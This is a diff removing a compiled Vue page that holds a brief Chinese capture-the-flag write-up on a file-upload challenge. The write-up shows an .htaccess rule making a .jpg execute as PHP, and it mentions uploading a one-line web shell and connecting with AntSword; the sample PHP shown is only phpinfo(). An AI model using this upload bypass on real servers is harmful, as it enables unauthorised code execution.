@@ -1,8 +1,0 @@
-import{_ as e,o as a,c as s,e as n}from"./app-d4f08b22.js";const t={},p=n(`<p>#文件上传</p><p><code>Server : Apache/2.4.7 (Ubuntu)</code> title: 试试和某些文件配合呢</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>htaccess文件是什么
-
-htaccess文件是Apache服务器中的一个配置文件，他负责相关目录下的网页配置。通过htaccess文件，可以帮助我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许或组织特定的用户或者，目录的访问，禁止目录列表，配置默认文档等功能。
-</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>有 <code>.htaccess</code> 文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;FilesMatch &quot;5.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;
-</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>上传 htacces文件 （将文件名中带有 &#39;111.jpg&#39; 的文件当作php文件解析） 上传一句话木马：111.jpg 之后蚁剑连接</p><p>111.jpg：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-	<span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?&gt;</span></span>
-</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>也可以</p>`,9),c=[p];function i(l,d){return a(),s("div",null,c)}const r=e(t,[["render",i],["__file","easyupload3.0.html.vue"]]);export{r as default};
